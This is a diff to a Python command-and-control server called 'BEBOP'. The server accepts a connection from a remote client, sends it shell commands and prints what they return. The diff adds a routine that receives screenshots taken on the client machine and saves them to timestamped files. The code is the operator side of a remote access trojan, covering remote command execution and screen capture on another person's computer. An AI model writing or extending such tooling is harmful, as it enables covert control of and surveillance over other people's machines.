@@ -1,6 +1,7 @@
 import socket
 import sys
 import threading
+import time
 
 def print_menu():
     print("/-------BEBOP-------/\n")
@@ -19,12 +20,12 @@ def establish_connection():
 
     print("Waiting on connections")
     conn_to_client, address = server.accept()
-    
+
     if conn_to_client:
         print(f"Connection to {address[0]}:{address[1]} Established!")
     else:
         sys.exit("Failed to recieve connection to client...Exiting")
-    
+
 
 def open_shell():
     while True:
@@ -35,15 +36,21 @@ def open_shell():
             conn_to_client.sendall(cmd.encode())
             break
         conn_to_client.sendall(cmd.encode())
-        output = conn_to_client.recv(4096)
+        output = conn_to_client.recv(1024)
         print(output.decode())
-        
 
-def recv_screenshot():
-    buf = conn_to_client.recv(40960000)
-    print(buf)
-            
-        
+def download_file():
+    file_size = conn_to_client.recv(8)
+    file_size = int(file_size.decode())
+    file_buff = conn_to_client.recv(1024)
+
+    file = open(f"screen_shot_{time.asctime(time.localtime(time.time()))}.png", "wb")
+    while file_buff:
+        print(f"Writing {len(file_buff)} bytes of data...")
+        file.write(file_buff)
+        file_buff = conn_to_client.recv(1024)
+
+    file.close()
 
 def main():
     establish_connection()
@@ -55,7 +62,7 @@ def main():
             open_shell()
         elif choice == "2":
             conn_to_client.sendall(b'2')
-            recv_screenshot()
+            download_file()
         elif choice == "6":
             conn_to_client.sendall(b'6')
             conn_to_client.close()
